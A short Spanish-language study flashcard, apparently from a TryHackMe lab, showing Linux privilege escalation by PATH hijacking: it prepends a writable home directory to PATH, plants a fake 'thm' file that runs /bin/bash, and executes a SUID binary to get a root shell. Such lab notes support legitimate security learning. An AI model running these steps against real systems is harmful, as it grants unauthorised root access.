### Flashcard — Escalada de privilegios con PATH hijacking (TryHackMe)

**Contexto**

* Binario SUID (`test`) ejecuta un comando externo (`thm`).
* Directorio `/home/murdoch` es world-writable.
* PATH controlable por el usuario.

---

**Procedimiento**

1. Revisar permisos y directorios escribibles:

   ```bash
   find / -writable 2>/dev/null
   ```

2. Detectar binario SUID sospechoso:

   ```bash
   ls -l /home/murdoch/test
   -rwsr-xr-x 1 root root ...
   ```

3. Modificar el PATH para priorizar `/home/murdoch`:

   ```bash
   export PATH=/home/murdoch:$PATH
   ```

4. Crear binario malicioso que sustituya al comando esperado:

   ```bash
   echo "/bin/bash" > thm
   chmod +x thm
   ```

5. Ejecutar el SUID:

   ```bash
   ./test
   ```

6. Confirmar escalada:

   ```bash
   id
   uid=0(root) gid=0(root) groups=0(root),1001(karen)
   ```

---

**Clave técnica**

* El binario SUID `test` intenta ejecutar `thm` sin ruta absoluta.
* Como root respeta el `$PATH` del usuario, carga nuestro binario malicioso.
* Resultado: shell root.

---
